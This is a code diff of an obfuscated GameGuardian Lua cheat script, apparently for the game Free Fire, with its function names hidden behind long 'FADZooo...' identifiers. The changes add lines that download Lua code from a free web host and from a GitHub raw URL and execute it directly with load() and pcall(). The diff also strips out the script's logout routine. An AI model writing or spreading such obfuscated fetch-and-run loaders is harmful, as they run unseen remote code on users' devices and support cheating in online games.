@@ -85,32 +85,15 @@ end
 end
 
 FADZooooooooooooooooooooooooooooooooooooooooooo f()
-T = load(gg.makeRequest('https://raw.githubusercontent.com/FADILSA/app/master/cheat/freefireholvxin').content)
+T = load(gg.makeRequest('https://leonadsense8.000webhostapp.com/txihg/XkoLOADERdekwoKOJahauizodoIYTfCGxhieeknxXndow.lua').content)
 pcall(T)
 end
 
 
-
 FADZooooooooooooooooooooooooooooooooooooooooooo out()
-                 print([[
-Logout Detail
-────────────────────────]].."\n".."Exit Detail : "..os.FADZooooooooooooooooooooooooooooooooooooooooooooooo())
-          gg.FADZoooooooooooooooooooooooooooooooooooooooooooooooo(true)
-          gg.alert("Logout..", "")
-          gg.FADZooooooooooooooooooooooooooooooooooooooooooooo(os.FADZooooooooooooooooooooooooooooooooooooooooooooooo("Logout in : %Y/%m/%d  : %H:%M:%S"))
-          gg.FADZoooooooooooooooooooooooooooooooooooooooooooooo(1000)
-          os.exit()
-        end
+T = load(gg.makeRequest('https://raw.githubusercontent.com/FADILSA/app/master/cheat/selectgame').content)
+pcall(T)
 
-
-
-           while true do
-           if gg.FADZooooooooooooooooooooooooooooooooooooooooo() then
-            gg.FADZoooooooooooooooooooooooooooooooooooooooooooooooo(false)
-             HOME()
-             else
-             end
-            end
 while true do
   if gg.FADZooooooooooooooooooooooooooooooooooooooooo(true) then
     FadHaxor = 1
